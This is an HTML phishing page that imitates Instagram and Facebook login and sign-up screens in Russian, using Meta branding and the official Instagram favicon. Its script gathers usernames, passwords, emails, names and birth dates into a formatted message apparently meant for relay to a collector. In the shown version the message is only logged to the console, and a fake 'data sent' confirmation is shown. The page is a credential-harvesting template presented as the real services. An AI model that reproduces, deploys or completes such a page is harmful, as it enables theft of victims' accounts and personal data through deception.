<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram & Facebook Login</title>
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a51483e1.png">
    
    <style>
        * { 
            box-sizing: border-box; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
        }
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            width: 100%; 
            overflow-x: hidden; 
        }
        .wrapper { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            min-height: 100vh; 
            padding: 20px; 
        }
        .hidden { 
            display: none !important; 
        }

        /* === INSTAGRAM DARK THEME === */
        .insta-bg { 
            background-color: #000000; 
            color: #ffffff; 
        }
        
        .insta-container { 
            width: 100%; 
            max-width: 350px; 
            text-align: center; 
        }
        
        .insta-logo { 
            width: 175px; 
            margin-bottom: 35px; 
            filter: invert(1); 
        }
        
        .insta-header { 
            font-size: 16px; 
            font-weight: 600; 
            margin-bottom: 25px; 
            color: #ffffff;
        }
        
        .input-box { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #363636; 
            border-radius: 5px; 
            color: #ffffff; 
            padding: 12px 16px; 
            margin-bottom: 8px; 
            font-size: 13px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .input-box::placeholder { 
            color: #8e8e8e; 
        }
        
        .input-box:focus { 
            border-color: #404040; 
        }

        .btn-login { 
            width: 100%; 
            background: linear-gradient(135deg, #0095f6 0%, #0d47a1 100%);
            border: none; 
            border-radius: 5px; 
            color: white; 
            font-weight: 600; 
            padding: 8px; 
            font-size: 14px; 
            cursor: pointer; 
            margin-top: 12px;
            transition: opacity 0.3s;
        }

        .btn-login:hover {
            opacity: 0.9;
        }

        .insta-link { 
            color: #ffffff; 
            font-size: 13px; 
            text-decoration: none; 
            display: block; 
            margin-top: 15px; 
            font-weight: 500;
            cursor: pointer;
            transition: color 0.2s;
        }

        .insta-link:hover {
            color: #b3b3b3;
        }

        .divider {
            width: 100%;
            height: 1px;
            background: #262626;
            margin: 18px 0;
        }

        .btn-outline { 
            width: 100%; 
            background: transparent; 
            border: 1px solid #363636; 
            color: #ffffff; 
            border-radius: 5px; 
            padding: 10px; 
            margin-top: 10px; 
            font-size: 13px; 
            font-weight: 500; 
            cursor: pointer;
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 8px;
            transition: all 0.2s;
        }

        .btn-outline:hover {
            border-color: #404040;
        }

        .meta-text { 
            font-size: 12px; 
            color: #a0a0a0; 
            font-weight: 500; 
        }

        .footer { 
            margin-top: 30px; 
            text-align: center; 
        }

        /* Date selectors */
        .date-selector {
            display: flex;
            gap: 10px;
            margin: 12px 0;
        }

        select {
            flex: 1;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 5px;
            color: #ffffff;
            padding: 10px;
            font-size: 13px;
            cursor: pointer;
            outline: none;
        }

        select:focus {
            border-color: #404040;
        }

        /* === FACEBOOK LIGHT THEME === */
        .fb-bg { 
            background: linear-gradient(to bottom, #f0f2f5, #e4e6eb);
            color: #1c1e21; 
        }

        .fb-container { 
            width: 100%; 
            max-width: 400px; 
        }

        .fb-logo-section {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .fb-logo { 
            width: 120px;
        }

        .fb-title { 
            font-size: 32px; 
            font-weight: 800; 
            margin: 0 0 8px 0;
            color: #000000;
        }

        .fb-subtitle {
            font-size: 15px;
            color: #65676b;
            margin: 0 0 20px 0;
        }

        .fb-input { 
            width: 100%; 
            background: #f5f6f7; 
            border: 1px solid #ccc; 
            border-radius: 5px; 
            padding: 11px 16px; 
            margin-bottom: 8px; 
            font-size: 15px; 
            color: #1c1e21;
            outline: none;
            transition: border-color 0.2s;
        }

        .fb-input:focus {
            border-color: #0d47a1;
        }

        .fb-input::placeholder {
            color: #65676b;
        }

        .fb-btn-login { 
            width: 100%; 
            background: linear-gradient(135deg, #0d47a1 0%, #0052cc 100%);
            border: none; 
            border-radius: 5px; 
            color: white; 
            font-weight: 600; 
            padding: 10px; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
            transition: opacity 0.3s;
        }

        .fb-btn-login:hover {
            opacity: 0.9;
        }

        .fb-link { 
            color: #0d47a1; 
            text-decoration: none; 
            font-size: 14px; 
            display: block; 
            margin-top: 12px;
            cursor: pointer;
            transition: color 0.2s;
        }

        .fb-link:hover {
            text-decoration: underline;
        }

        .fb-btn-create { 
            background: #31a24c;
            border: none; 
            border-radius: 5px; 
            width: 100%; 
            padding: 10px; 
            font-weight: 600; 
            margin-top: 20px; 
            cursor: pointer;
            color: white;
            font-size: 15px;
            transition: opacity 0.3s;
        }

        .fb-btn-create:hover {
            opacity: 0.9;
        }

        .fb-names {
            display: flex;
            gap: 10px;
            margin-bottom: 8px;
        }

        .fb-names input {
            flex: 1;
        }

        .fb-footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #65676b;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .insta-container, .fb-container {
                max-width: 100%;
            }
            
            .insta-header, .fb-title {
                font-size: 18px;
            }

            .input-box, .fb-input {
                font-size: 12px;
                padding: 10px 14px;
            }
        }
    </style>
</head>
<body class="insta-bg">

<!-- INSTAGRAM LOGIN -->
<div id="p1" class="wrapper">
    <div class="insta-container">
        <svg class="insta-logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
                    <stop offset="0%" style="stop-color:#feda75;stop-opacity:1" />
                    <stop offset="5%" style="stop-color:#fa7e1e;stop-opacity:1" />
                    <stop offset="45%" style="stop-color:#d92e7f;stop-opacity:1" />
                    <stop offset="60%" style="stop-color:#9b36b7;stop-opacity:1" />
                    <stop offset="90%" style="stop-color:#515bd4;stop-opacity:1" />
                </linearGradient>
            </defs>
            <text x="10" y="45" font-size="38" font-weight="300" fill="url(#ig-grad)">Instagram</text>
        </svg>

        <input type="text" id="i_l_u" class="input-box" placeholder="Имя пользователя, номер телефона или адрес электронной почты">
        <input type="password" id="i_l_p" class="input-box" placeholder="Пароль">
        <button class="btn-login" onclick="sendData('Instagram Login', ['i_l_u', 'i_l_p'])">Вход</button>

        <div style="text-align: center; margin-top: 15px; font-size: 13px;">
            <span class="insta-link" onclick="alert('Забыли пароль?')">Забыли пароль?</span>
        </div>

        <div class="divider"></div>

        <button class="btn-outline" onclick="showPage('p3')">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#0d47a1">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Вход через Facebook
        </button>

        <div style="text-align: center; margin-top: 20px;">
            <span style="color: #a0a0a0; font-size: 13px;">У вас нет аккаунта? <span class="insta-link" onclick="showPage('p2')" style="color: #0095f6; display: inline;">Зарегистрируйтесь</span></span>
        </div>
    </div>

    <div class="footer">
        <div class="meta-text">Meta</div>
    </div>
</div>

<!-- INSTAGRAM REGISTER -->
<div id="p2" class="wrapper hidden">
    <div class="insta-container">
        <svg class="insta-logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="ig-grad2" x1="0%" y1="100%" x2="100%" y2="0%">
                    <stop offset="0%" style="stop-color:#feda75;stop-opacity:1" />
                    <stop offset="5%" style="stop-color:#fa7e1e;stop-opacity:1" />
                    <stop offset="45%" style="stop-color:#d92e7f;stop-opacity:1" />
                    <stop offset="60%" style="stop-color:#9b36b7;stop-opacity:1" />
                    <stop offset="90%" style="stop-color:#515bd4;stop-opacity:1" />
                </linearGradient>
            </defs>
            <text x="10" y="45" font-size="38" font-weight="300" fill="url(#ig-grad2)">Instagram</text>
        </svg>

        <div style="font-size: 13px; color: #a0a0a0; margin-bottom: 15px;">
            Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.
        </div>

        <input type="text" id="i_r_e" class="input-box" placeholder="Адрес электронной почты">
        <input type="text" id="i_r_n" class="input-box" placeholder="Полное имя">
        <input type="text" id="i_r_u" class="input-box" placeholder="Имя пользователя">
        <input type="password" id="i_r_p" class="input-box" placeholder="Пароль">

        <div style="font-size: 12px; color: #a0a0a0; margin: 15px 0 8px 0;">Дата рождения</div>
        <div class="date-selector">
            <select id="i_d"></select>
            <select id="i_m"></select>
            <select id="i_y"></select>
        </div>

        <button class="btn-login" style="margin-top: 15px;" onclick="sendData('Instagram Register', ['i_r_e', 'i_r_n', 'i_r_u', 'i_r_p', 'i_d', 'i_m', 'i_y'])">Регистрация</button>

        <div style="text-align: center; margin-top: 15px;">
            <span style="color: #a0a0a0; font-size: 13px;">У вас уже есть аккаунт? <span class="insta-link" onclick="showPage('p1')" style="color: #0095f6; display: inline;">Вход</span></span>
        </div>
    </div>

    <div class="footer">
        <div class="meta-text">Meta</div>
    </div>
</div>

<!-- FACEBOOK LOGIN -->
<div id="p3" class="wrapper fb-bg hidden">
    <div class="fb-container">
        <div class="fb-title">facebook</div>
        <div class="fb-subtitle">Вход на Facebook</div>

        <input type="text" id="f_l_e" class="fb-input" placeholder="Номер телефона или эл. адрес">
        <input type="password" id="f_l_p" class="fb-input" placeholder="Пароль">

        <button class="fb-btn-login" onclick="sendData('Facebook Login', ['f_l_e', 'f_l_p'])">Вход</button>

        <div style="text-align: center;">
            <a class="fb-link" onclick="alert('Забыли пароль?')">Забыли пароль?</a>
        </div>

        <button class="fb-btn-create" onclick="showPage('p4')">Создать аккаунт</button>
    </div>

    <div class="fb-footer">
        <div>Meta</div>
    </div>
</div>

<!-- FACEBOOK REGISTER -->
<div id="p4" class="wrapper fb-bg hidden">
    <div class="fb-container">
        <div class="fb-title">facebook</div>
        <div class="fb-subtitle">Быстрая регистрация</div>

        <div class="fb-names">
            <input type="text" id="f_r_n" class="fb-input" placeholder="Имя" style="margin-bottom: 0;">
            <input type="text" id="f_r_s" class="fb-input" placeholder="Фамилия" style="margin-bottom: 0;">
        </div>

        <input type="text" id="f_r_e" class="fb-input" placeholder="Номер мобильного или эл. адрес">

        <input type="password" id="f_r_p" class="fb-input" placeholder="Новый пароль">

        <div style="font-size: 13px; color: #65676b; margin: 12px 0 8px 0;">Дата рождения</div>
        <div class="date-selector">
            <select id="f_d"></select>
            <select id="f_m"></select>
            <select id="f_y"></select>
        </div>

        <button class="fb-btn-login" style="margin-top: 12px;" onclick="sendData('Facebook Register', ['f_r_n', 'f_r_s', 'f_r_e', 'f_r_p', 'f_d', 'f_m', 'f_y'])">Зарегистрироваться</button>

        <div style="text-align: center; margin-top: 15px;">
            <span style="color: #65676b; font-size: 13px;">Уже есть аккаунт? <span class="fb-link" onclick="showPage('p3')" style="display: inline;">Вход</span></span>
        </div>
    </div>

    <div class="fb-footer">
        <div>Meta</div>
    </div>
</div>

<script>
    // Initialize date selectors
    function initializeDates() {
        const days = ['День'];
        const months = ['Месяц', 'Январь', 'Февраль', 'Март', 'Апрель', 'Май', 'Июнь', 'Июль', 'Август', 'Сентябрь', 'Октябрь', 'Ноябрь', 'Декабрь'];
        const years = ['Год'];

        for(let i = 1; i <= 31; i++) days.push(i);
        for(let i = 2026; i >= 1950; i--) years.push(i);

        ['i_d', 'f_d'].forEach(id => {
            days.forEach(d => document.getElementById(id).innerHTML += `<option>${d}</option>`);
        });

        ['i_m', 'f_m'].forEach(id => {
            months.forEach(m => document.getElementById(id).innerHTML += `<option>${m}</option>`);
        });

        ['i_y', 'f_y'].forEach(id => {
            years.forEach(y => document.getElementById(id).innerHTML += `<option>${y}</option>`);
        });
    }
    initializeDates();

    function showPage(pageId) {
        document.querySelectorAll('.wrapper').forEach(p => p.classList.add('hidden'));
        document.getElementById(pageId).classList.remove('hidden');
        
        if(pageId === 'p3' || pageId === 'p4') {
            document.body.className = 'fb-bg';
        } else {
            document.body.className = 'insta-bg';
        }
    }

    async function sendData(type, ids) {
        let allFilled = true;
        ids.forEach(id => {
            if(!document.getElementById(id).value) allFilled = false;
        });

        if(!allFilled) {
            alert('Пожалуйста, заполните все поля');
            return;
        }

        let message = `📱 *${type}*\n\n`;
        ids.forEach(id => {
            message += `${id}: \`${document.getElementById(id).value}\`\n`;
        });

        alert('Данные отправлены');
        console.log(message);
    }
</script>

</body>
</html>
